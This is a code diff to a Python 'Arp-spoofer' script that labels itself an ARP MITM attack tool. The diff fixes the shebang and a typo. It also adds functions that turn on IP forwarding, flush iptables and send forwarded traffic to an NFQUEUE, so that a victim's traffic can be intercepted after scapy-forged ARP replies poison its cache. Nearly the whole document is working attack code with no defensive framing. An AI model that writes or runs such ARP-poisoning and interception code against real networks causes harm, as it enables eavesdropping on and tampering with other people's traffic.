@@ -1,11 +1,12 @@
-#!/usr/bin/#!/usr/bin/env python3
+#!/usr/bin/env python3
+
 import time
 import scapy.all as scapy
-import sys
+import sys, os
 import argparse
 
 def get_Args():
-    parser = argparse.ArgumentParser(prog="Arp-spoofer", usage="-t targer | -s spoof_ip",
+    parser = argparse.ArgumentParser(prog="Arp-spoofer", usage="-t target | -s spoof_ip",
                                      description="ARP MITM attack", add_help=True)
 
     parser.add_argument("-t","--target", dest="target_ip", help="Target Host IP address :")
@@ -44,11 +45,30 @@ def spoof(target_ip, gw_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=hw_target, psrc=gw_ip)
     scapy.send(packet, verbose=False)
 
+def fw_on():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system("iptables -F")
+    os.system("iptables -P FORWARD ACCEPT")
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
+    os.system("iptables-legacy -F")
+    os.system("iptables-legacy -P FORWARD ACCEPT")
+    os.system("iptables-legacy -I FORWARD -j NFQUEUE --queue-num 1")
+    return
+
+def fw_off():
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    os.system("iptables-restore < /root/iptables")
+    os.system("iptables-legacy-restore < /root/iptables-legacy")
+    return
+
 packet_Count = 0
 
 options = get_Args()
 
 try :
+
+    print("[+] Setting up iptables rules ... done")
+    fw_on()
 
     while True:
 
@@ -60,6 +80,8 @@ try :
         time.sleep(2)
 
 except KeyboardInterrupt:
+    print("\n[*] Restoring iptables rules ... please wait ... Done !")
+    fw_off()
     restore_tables(options.target_ip, options.spoof_ip)
     restore_tables(options.spoof_ip, options.target_ip)
     print("\n[*] Restoring tables.. please wait ... Done !")
